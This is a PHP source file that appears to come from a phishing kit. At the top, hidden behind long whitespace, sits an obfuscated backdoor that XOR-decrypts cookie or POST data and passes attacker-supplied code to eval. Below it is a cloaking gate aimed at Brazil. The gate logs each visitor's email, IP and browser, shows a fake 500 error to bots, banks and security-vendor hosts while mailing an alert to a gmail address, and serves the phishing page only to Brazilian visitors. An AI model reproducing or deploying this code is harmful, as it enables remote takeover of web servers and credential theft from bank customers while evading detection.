<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $xe62cec = 877;$GLOBALS['h2b6'] = Array();global $h2b6;$h2b6 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['nfb7d640'] = "\x3a\x37\x7b\x34\x45\x2b\x68\x5d\x39\x6e\x71\x33\x4f\x41\x53\x6d\x22\x2e\x67\x6b\x5e\x4c\x3d\x52\x50\x4b\x36\xa\x3c\x28\x29\x77\x76\x5f\x64\x56\x2f\x60\x7c\x54\xd\x20\x46\x5b\x2a\x72\x48\x7a\x7d\x79\x44\x73\x70\x7e\x69\x6c\x5a\x3e\x24\x51\x78\x25\x4a\x4d\x47\x4e\x43\x40\x58\x21\x75\x2d\x66\x30\x23\x3f\x57\x61\x3b\x35\x74\x27\x5c\x59\x9\x63\x6f\x2c\x55\x6a\x62\x65\x38\x49\x42\x32\x31\x26";$h2b6[$h2b6['nfb7d640'][55].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][26]] = $h2b6['nfb7d640'][85].$h2b6['nfb7d640'][6].$h2b6['nfb7d640'][45];$h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][1]] = $h2b6['nfb7d640'][86].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][34];$h2b6[$h2b6['nfb7d640'][70].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][8]] = $h2b6['nfb7d640'][34].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][9].$h2b6['nfb7d640'][91];$h2b6[$h2b6['nfb7d640'][19].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][8]] = $h2b6['nfb7d640'][51].$h2b6['nfb7d640'][80].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][55].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][9];$h2b6[$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][96]] = $h2b6['nfb7d640'][34].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][9].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][34];$h2b6[$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][92]] = $h2b6['nfb7d640'][54].$h2b6['nfb7d640'][9].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][51].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][80];$h2b6[$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][72]] = $h2b6['nfb7d640'][51].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][55].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][47].$h2b6['nfb7d640'][91];$h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][73]] = $h2b6['nfb7d640'][52].$h2b6['nfb7d640'][6].$h2b6['nfb7d640'][52].$h2b6['nfb7d640'][32].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][51].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][86].$h2b6['nfb7d640'][9];$h2b6[$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][1].$h2b6['nfb7d640'][73]] = $h2b6['nfb7d640'][70].$h2b6['nfb7d640'][9].$h2b6['nfb7d640'][51].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][55].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][47].$h2b6['nfb7d640'][91];$h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][1]] = $h2b6['nfb7d640'][90].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][51].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][86].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][91];$h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][90]] = $h2b6['nfb7d640'][51].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][80].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][80].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][15].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][55].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][15].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][80];$h2b6[$h2b6['nfb7d640'][10].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][34]] = $h2b6['nfb7d640'][6].$h2b6['nfb7d640'][1].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][92];$h2b6[$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][3]] = $h2b6['nfb7d640'][85].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][72];$h2b6[$h2b6['nfb7d640'][6].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][91]] = $_POST;$h2b6[$h2b6['nfb7d640'][6].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][8]] = $_COOKIE;@$h2b6[$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][92]]($h2b6['nfb7d640'][91].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][86].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][55].$h2b6['nfb7d640'][86].$h2b6['nfb7d640'][18], NULL);@$h2b6[$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][92]]($h2b6['nfb7d640'][55].$h2b6['nfb7d640'][86].$h2b6['nfb7d640'][18].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][86].$h2b6['nfb7d640'][45].$h2b6['nfb7d640'][51], 0);@$h2b6[$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][92]]($h2b6['nfb7d640'][15].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][60].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][60].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][70].$h2b6['nfb7d640'][80].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][86].$h2b6['nfb7d640'][9].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][80].$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][15].$h2b6['nfb7d640'][91], 0);@$h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][90]](0);if (!$h2b6[$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][96]]($h2b6['nfb7d640'][13].$h2b6['nfb7d640'][21].$h2b6['nfb7d640'][23].$h2b6['nfb7d640'][4].$h2b6['nfb7d640'][13].$h2b6['nfb7d640'][50].$h2b6['nfb7d640'][83].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][23].$h2b6['nfb7d640'][88].$h2b6['nfb7d640'][65].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][77])){$h2b6[$h2b6['nfb7d640'][70].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][8]]($h2b6['nfb7d640'][13].$h2b6['nfb7d640'][21].$h2b6['nfb7d640'][23].$h2b6['nfb7d640'][4].$h2b6['nfb7d640'][13].$h2b6['nfb7d640'][50].$h2b6['nfb7d640'][83].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][23].$h2b6['nfb7d640'][88].$h2b6['nfb7d640'][65].$h2b6['nfb7d640'][33].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][77], 1);$a99e566db = NULL;$s4f0e4a = NULL;$h2b6[$h2b6['nfb7d640'][6].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][95]] = $h2b6['nfb7d640'][73].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][71].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][71].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][71].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][71].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][96];global $h839dc2;function  c11495abf($a99e566db, $r1ed96){global $h2b6;$a7d84 = "";for ($va383b4=0; $va383b4<$h2b6[$h2b6['nfb7d640'][19].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][8]]($a99e566db);){for ($w08b24=0; $w08b24<$h2b6[$h2b6['nfb7d640'][19].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][8]]($r1ed96) && $va383b4<$h2b6[$h2b6['nfb7d640'][19].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][8]]($a99e566db); $w08b24++, $va383b4++){$a7d84 .= $h2b6[$h2b6['nfb7d640'][55].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][26]]($h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][1]]($a99e566db[$va383b4]) ^ $h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][79].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][1]]($r1ed96[$w08b24]));}}return $a7d84;}function  h74abcd8($a99e566db, $r1ed96){global $h2b6;global $h839dc2;return $h2b6[$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][3]]($h2b6[$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][91].$h2b6['nfb7d640'][92].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][3]]($a99e566db, $h839dc2), $r1ed96);}foreach ($h2b6[$h2b6['nfb7d640'][6].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][34].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][8]] as $r1ed96=>$w62c65052){$a99e566db = $w62c65052;$s4f0e4a = $r1ed96;}if (!$a99e566db){foreach ($h2b6[$h2b6['nfb7d640'][6].$h2b6['nfb7d640'][26].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][91]] as $r1ed96=>$w62c65052){$a99e566db = $w62c65052;$s4f0e4a = $r1ed96;}}$a99e566db = @$h2b6[$h2b6['nfb7d640'][54].$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][1].$h2b6['nfb7d640'][73]]($h2b6[$h2b6['nfb7d640'][10].$h2b6['nfb7d640'][95].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][34]]($h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][85].$h2b6['nfb7d640'][96].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][1]]($a99e566db), $s4f0e4a));if (isset($a99e566db[$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][19]]) && $h839dc2==$a99e566db[$h2b6['nfb7d640'][77].$h2b6['nfb7d640'][19]]){if ($a99e566db[$h2b6['nfb7d640'][77]] == $h2b6['nfb7d640'][54]){$va383b4 = Array($h2b6['nfb7d640'][52].$h2b6['nfb7d640'][32] => @$h2b6[$h2b6['nfb7d640'][49].$h2b6['nfb7d640'][90].$h2b6['nfb7d640'][3].$h2b6['nfb7d640'][73]](),$h2b6['nfb7d640'][51].$h2b6['nfb7d640'][32] => $h2b6['nfb7d640'][96].$h2b6['nfb7d640'][17].$h2b6['nfb7d640'][73].$h2b6['nfb7d640'][71].$h2b6['nfb7d640'][96],);echo @$h2b6[$h2b6['nfb7d640'][72].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][8].$h2b6['nfb7d640'][11].$h2b6['nfb7d640'][72]]($va383b4);}elseif ($a99e566db[$h2b6['nfb7d640'][77]] == $h2b6['nfb7d640'][91]){eval/*fa8e34*/($a99e566db[$h2b6['nfb7d640'][34]]);}exit();}} ?><?php
date_default_timezone_set('America/Sao_Paulo');
require 'geoip2.phar';
use GeoIp2\Database\Reader;

    //vars + email
    $data = date("d-M-Y");
    $ip = $_SERVER['REMOTE_ADDR'];
    $host = gethostbyaddr($ip);
    $Hora_Servidor = "+0";
    $acerto = time() + ($Hora_Servidor * 60 * 60);
    $hora = date("H:i:s", $acerto);
    $email = $_GET['sid'];
    $emailx = base64_encode($email);

if(empty($email)){ $email = "EMAIL"; }




$blockedUserAgents = array(
    "webfilter", 
    "feedfetcher"
);

    //block bots
    if(!empty($_SERVER['HTTP_USER_AGENT'])) {
        $userAgents = array("Google", "GoogleBot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
        if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        echo $e500;
        exit;
        }
    }
    
    //erro 500
    $e500 = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head>
    <title>500 Internal Server Errorr</title></head><body>
    <h1>Internal Server Error</h1>
    <p>The server encountered an internal error or
    misconfiguration and was unable to complete
    your request.</p>
    <p>Please contact the server administrator,
    administrator and inform them of the time the error occurred,
    and anything you might have done that may have
    caused the error.</p>
    <p>More information about this error may be available
    in the server error log.</p><hr><address></address></body></html>';


// Functions
function validIp() {
	try {
		$reader = new Reader(dirname(__FILE__) . '/GeoLite2-Country.mmdb');
		$record = $reader->country($_SERVER['REMOTE_ADDR']);
		$country = strtolower($record->country->isoCode);
		//echo $country;
		return $country;
	} catch (Exception $e) {
		return false;
	}
}
 
function validAgent(){
    global $blockedUserAgents;
    foreach ($blockedUserAgents as $userAgent) {
            if(strpos($_SERVER['HTTP_USER_AGENT'], $userAgent) !== false){
                    return true;
            }
    }
    
    return false;
}
        $siglapais = validIp();

 //       $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
  //      if($query && $query['status'] == 'success') {
   //         $pais = $query['country'];
    //        $regiao = $query['regionName'];
     //       $cid = $query['city'];
      //  }

//navegador
            $MSIE = strpos($_SERVER['HTTP_USER_AGENT'],"MSIE");
            $Firefox = strpos($_SERVER['HTTP_USER_AGENT'],"Firefox");
            $Mozilla = strpos($_SERVER['HTTP_USER_AGENT'],"Mozilla");
            $Chrome = strpos($_SERVER['HTTP_USER_AGENT'],"Chrome");
            $Chromium = strpos($_SERVER['HTTP_USER_AGENT'],"Chromium");
            $Safari = strpos($_SERVER['HTTP_USER_AGENT'],"Safari");
            $Opera = strpos($_SERVER['HTTP_USER_AGENT'],"Opera");

            if ($MSIE == true) { $navegador = "IE"; }
            else if ($Firefox == true) { $navegador = "Firefox"; }
            else if ($Mozilla == true) { $navegador = "Firefox"; }
            else if ($Chrome == true) { $navegador = "Chrome"; }
            else if ($Chromium == true) { $navegador = "Chromium"; }
            else if ($Safari == true) { $navegador = "Safari"; }
            else if ($Opera == true) { $navegador = "Opera"; }
            else { $navegador = $_SERVER['HTTP_USER_AGENT']; }

            //verifica plataforma
            $useragent = $_SERVER['HTTP_USER_AGENT'];
            if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4))){
                $plataforma = "MOBILE";
            }
            else { $plataforma = "PC"; }
            
            //cria log
            $registos = "reg.txt";
            $linhas   = @count(file($registos));

            ignore_user_abort(false);

            if (!file_exists($registos))
            $fp = @fopen($registos, "w+");
            else
            $fp = @fopen($registos, "a");
            @flock ($fp, LOCK_EX);
            @fwrite($fp, "$data**$hora**$plataforma**$email**".$ip." (".$host.")**".$navegador."**".$siglapais."\n");
            @flock ($fp, LOCK_UN);
            @fclose($fp);

            ignore_user_abort(true);
            
        
        $uri = $_SERVER["REQUEST_URI"];
        $ipserver = $_SERVER["SERVER_ADDR"];
        $resuelveserver = gethostbyaddr($ipserver);

        $ipx = getenv("REMOTE_ADDR");
        $host = gethostbyaddr($ipx);
        $banhosts = array("186.231.96.130","186-231-96-130.livetim.timbrasil.com.br", "bradesco","pish","santander",
        "scotiabank", "google-bot", "google-proxy", "googleproxy", "netcraft.com", "ebay.com", "panda.com","microsoft.com",
        "fbi.gov", "google.com", "msn.com","yahoo.com", "cia.gov", "$resuelveserver", "bankofamerica", "viabcp", "veritas",
        "nod32","antipishing","kapersky", "norton", "symantec","rsasecurity", "bancopopular", "paypal", "unicaja", "cloudentel",
        "banesto", "cajamadrid", "bancopastor", "rsa.com", "symantecstore", "gfihispana", "fraudwatchinternational", "verisign",
        "markmonitor", "anti-phishing", "pandasoftware", "delitosinformaticos", "zonealarm", "alerta-antivirus", "vsantivirus",
        "nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", "mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft",
        "bitdefender-es", "sophos", "activescan", "avast", "bitdefender", "trendmicro-europe", "clamav", "clamwin", "eset",
        "symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor", "detector", "letti", "itau",
        "santander", "dufrio", "mx.", "bradesco", "bb.com.br", "uptimerobot.com");

        $x = count($banhosts);

        $m = "lyscanhvqv@gmail.com";

        for ($y = 0; $y < $x; $y++) {
           if (strpos($host ,$banhosts[$y]) == true) {
            echo $e500;
            @mail($m, $banhosts[$y],$ipx);
            exit;
           } 
        }


// Run
if(validIp() == 'br'){
    //echo "it works CL";
    include "home.php";
    //echo "it works BR";
} else {
    include "index1.html";
}

